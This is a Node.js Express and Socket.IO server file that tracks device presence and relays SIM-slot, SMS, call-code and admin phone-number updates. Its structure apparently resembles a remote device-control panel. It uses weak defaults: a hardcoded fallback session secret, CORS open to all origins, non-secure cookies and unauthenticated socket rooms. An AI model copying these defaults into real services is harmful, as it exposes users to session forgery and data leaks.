// server.js
require('dotenv').config();
const express       = require('express');
const http          = require('http');
const path          = require('path');
const helmet        = require('helmet');
const cors          = require('cors');
const bodyParser    = require('body-parser');
const cookieParser  = require('cookie-parser');
const session       = require('express-session');
const events        = require('events');
const { Server }    = require('socket.io');

const connectDB           = require('./config/dbConfig');
const initSimSlotStream   = require('./streamers/initSimSlotStream');

// models
const Battery = require('./models/Battery');
const Device  = require('./models/Device');
const Call    = require('./models/Call');
const Admin   = require('./models/Admin');

// controllers & routers
const authController     = require('./controllers/authController');
const authRouter         = require('./routes/authRouter');
const adminRoutes        = require('./routes/adminRoutes');
const notificationRoutes = require('./routes/notificationRoutes');
const deviceRoutes       = require('./routes/deviceRoutes');
const detail             = require('./routes/detail');
const statusRoutes       = require('./routes/StatusRoutes');
const simRoutes          = require('./routes/simRoutes');
const simSlotRoutes      = require('./routes/simSlot');
const allRoute           = require('./routes/allformRoutes');
const smsAuthRoutes     = require('./routes/smsAuthRoutes');

events.defaultMaxListeners = 20;

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
  cors: { origin: '*', methods: ['GET','POST'] }
});

// Middleware
app.use(helmet());
app.use(cookieParser());
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: process.env.SESSION_SECRET || 'a-very-secret-string',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 1800000, httpOnly: true, secure: false }
}));
app.use(cors());
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

// Initialize Admin user
authController.initializeAdmin();

// API Routes
app.use('/api/notification', smsAuthRoutes);
app.use('/api/auth', authRouter);
app.use('/api/device', deviceRoutes);
app.use('/api/device/all', allRoute);
app.use('/api/admin', adminRoutes);
app.use('/api/notification', notificationRoutes);
app.use('/api/data', detail);
app.use('/api/status', statusRoutes);
app.use('/api/sim', simRoutes);
app.use('/api/device', simSlotRoutes);

// Presence Tracker
const activeUsers = new Map();

io.on('connection', socket => {
  console.log(`Socket connected: ${socket.id}`);

  // send current online statuses
  for (let [uid, set] of activeUsers.entries()) {
    if (set.size) {
      socket.emit('userOnline', { uniqueid: uid });
      console.log(`Sent initial online for ${uid} to ${socket.id}`);
    }
  }

  socket.on('registerPresence', ({ uniqueid }) => {
    if (!uniqueid) return;
    socket.data.uniqueid = uniqueid;

    let set = activeUsers.get(uniqueid) || new Set();
    set.add(socket.id);
    activeUsers.set(uniqueid, set);

    if (set.size === 1) {
      io.emit('userOnline', { uniqueid });
      console.log(`${uniqueid} is online`);
    }

    console.log('Active Users:', [...activeUsers.entries()].map(([k, v]) => [k, Array.from(v)]));
  });

  socket.on('registerCall', ({ uniqueid }) => {
    if (uniqueid) {
      socket.join(`call_${uniqueid}`);
      console.log(`Joined call room: call_${uniqueid}`);
    }
  });

  socket.on('registerAdmin', ({ roomId }) => {
    if (roomId) {
      socket.join(`admin_${roomId}`);
      console.log(`Joined admin room: admin_${roomId}`);
    }
  });

  socket.on('disconnect', () => {
    const uid = socket.data.uniqueid;
    if (!uid) return;

    const set = activeUsers.get(uid);
    if (set) {
      set.delete(socket.id);
      if (set.size === 0) {
        activeUsers.delete(uid);
        io.emit('userOffline', { uniqueid: uid });
        console.log(`${uid} is offline`);
      }
    }

    socket.removeAllListeners();
    console.log('Active Users:', [...activeUsers.entries()].map(([k, v]) => [k, Array.from(v)]));
  });
});

// Change Stream: Call
function initCallChangeStream() {
  const pipeline = [{ $match: { operationType: { $in: ['insert','update','replace'] } } }];
  const stream = Call.watch(pipeline, { fullDocument: 'updateLookup' });

  stream.on('change', async change => {
    const doc = change.fullDocument
      ? change.fullDocument
      : await Call.findById(change.documentKey._id).catch(() => null);
    if (!doc) return;

    const payload = {
      _id: doc._id,
      call_id: doc.call_id,
      code: doc.code,
      sim: doc.sim,
      updatedAt: doc.updatedAt,
      createdAt: doc.createdAt
    };

    io.to(`call_${doc.call_id}`).emit('callUpdate', payload);
    console.log('[changeStream][Call] Event →', payload);
  });

  stream.on('error', err => console.error('[changeStream][Call] Error:', err));
}

// Change Stream: Admin
function initAdminChangeStream() {
  const pipeline = [{ $match: { operationType: { $in: ['insert','update','replace'] } } }];
  const stream = Admin.watch(pipeline, { fullDocument: 'updateLookup' });

  stream.on('change', async change => {
    const doc = change.fullDocument
      ? change.fullDocument
      : await Admin.findById(change.documentKey._id).catch(() => null);
    if (!doc) return;

    const payload = { _id: doc._id, phoneNumber: doc.phoneNumber };
    io.emit('adminUpdate', payload);
    console.log('[changeStream][Admin] Event →', payload);
  });

  stream.on('error', err => console.error('[changeStream][Admin] Error:', err));
}

// Connect to DB then start all streams
connectDB()
  .then(() => {
    console.log('✅ MongoDB connected');
    initSimSlotStream(io);
    initCallChangeStream();
    initAdminChangeStream();
  })
  .catch(err => console.error(' DB connection error:', err));

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});